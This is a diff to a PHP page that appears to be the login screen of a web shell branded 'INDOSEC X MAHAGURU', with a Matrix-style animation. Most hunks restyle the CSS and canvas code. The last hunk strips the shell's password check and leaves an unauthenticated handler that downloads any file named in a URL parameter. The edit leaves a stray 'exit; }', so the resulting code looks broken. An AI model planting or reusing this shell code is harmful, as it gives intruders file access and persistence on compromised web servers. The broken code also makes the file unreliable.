@@ -31,7 +31,7 @@ if (!isset($_SESSION['login'])) {
 }
 
 body{
-    background:#001a00;
+    background:#002200;
     color:#00ff88;
     overflow:hidden;
 }
@@ -53,61 +53,37 @@ canvas{
     text-align:center;
 }
 
-.title{
-    font-size:30px;
-    margin-bottom:20px;
-    text-shadow:0 0 15px #00ff88;
-}
-
 .logo{
-    width:250px;
-    margin-bottom:50px;
+    width:200px;
+    margin-bottom:40px;
     filter: drop-shadow(0 0 15px #00ff88);
 }
-
 
 input{
     width:260px;
     padding:12px;
     margin:10px;
-    background:#002b00;
+    background:#003300;
     border:1px solid #00ff88;
     color:#00ff88;
-    outline:none;
 }
 
 button{
-    padding:12px 35px;
-    background:#002b00;
+    padding:12px 30px;
+    background:#003300;
     border:1px solid #00ff88;
     color:#00ff88;
     cursor:pointer;
-    transition:0.3s;
-}
-
-button:hover{
-    background:#00ff88;
-    color:#002b00;
 }
 
 .error{
-    color:#ff4444;
-    margin-top:10px;
-}
-
-.dashboard{
-    text-align:center;
-    margin-top:100px;
-    font-size:20px;
-    text-shadow:0 0 10px #00ff88;
+    color:red;
 }
 </style>
 </head>
 <body>
 
 <canvas id="matrix"></canvas>
-
-<?php if(!isset($_SESSION['login'])){ ?>
 
 <div class="container">
     <img src="https://lukalee.site/logo/mahaguru-logo.png" class="logo">
@@ -119,16 +95,6 @@ button:hover{
 
     <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
 </div>
-
-<?php } else { ?>
-
-<div class="dashboard">
-    <h1>INDOSEC X MAHAGURU</h1>
-    <p>Welcome to Secure System</p>
-    <br>
-</div>
-
-<?php } ?>
 
 <script>
 const canvas = document.getElementById("matrix");
@@ -168,99 +134,41 @@ class Spider {
         ctx.arc(this.x, this.y, 4, 0, Math.PI * 2);
         ctx.fillStyle = "#00ff88";
         ctx.fill();
-
-        for(let i=0;i<4;i++){
-            ctx.beginPath();
-            ctx.moveTo(this.x, this.y);
-            ctx.lineTo(
-                this.x + Math.cos(i*1.5)*12,
-                this.y + Math.sin(i*1.5)*12
-            );
-            ctx.strokeStyle = "#00ff88";
-            ctx.stroke();
-        }
     }
 }
 
 const spiders = [];
-for(let i=0;i<10;i++){
-    spiders.push(new Spider(
-        Math.random()*window.innerWidth,
-        Math.random()*window.innerHeight
-    ));
+for(let i=0;i<8;i++){
+    spiders.push(new Spider(Math.random()*innerWidth, Math.random()*innerHeight));
 }
 
-let mouse = {x:window.innerWidth/2, y:window.innerHeight/2};
+let mouse = {x:innerWidth/2,y:innerHeight/2};
 
-window.addEventListener("pointermove", e=>{
+window.addEventListener("mousemove", e=>{
     mouse.x = e.clientX;
     mouse.y = e.clientY;
 });
 
-let letters = "01".split("");
-let fontSize = 14;
-let columns;
-let drops = [];
-
-function initMatrix(){
-    columns = canvas.width / fontSize;
-    drops = [];
-    for(let x=0;x<columns;x++) drops[x]=1;
-}
-initMatrix();
-
-function drawMatrix(){
-    ctx.fillStyle = "rgba(0,20,0,0.15)";
+function animate(){
+    ctx.fillStyle="rgba(0,30,0,0.2)";
     ctx.fillRect(0,0,canvas.width,canvas.height);
 
-    ctx.fillStyle = "#00ff88";
-    ctx.font = fontSize + "px monospace";
-
-    for(let i=0;i<drops.length;i++){
-        let text = letters[Math.floor(Math.random()*letters.length)];
-        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
-
-        if(drops[i]*fontSize > canvas.height && Math.random()>0.975)
-            drops[i]=0;
-
-        drops[i]++;
-    }
-}
-
-function animate(){
-    drawMatrix();
-
-    spiders.forEach(spider=>{
-        spider.follow(mouse.x, mouse.y);
-        spider.draw();
+    spiders.forEach(s=>{
+        s.follow(mouse.x, mouse.y);
+        s.draw();
     });
 
     requestAnimationFrame(animate);
 }
-
 animate();
 </script>
 
 </body>
 </html>
 <?php
-session_start();
-
-/* LOGIN BARU */
-
-/* ↓↓↓ KODE SHELL LU (PANJANG) ↓↓↓ */
-if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    } else {
-        login_shell();
-    }
+exit;
 }
-/*
-    * Akhir Login
-    *
-    * Aksi Download
-*/
+/* ==== END LOGIN ==== */
 if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
     @ob_clean();
     $file = $_GET['file'];
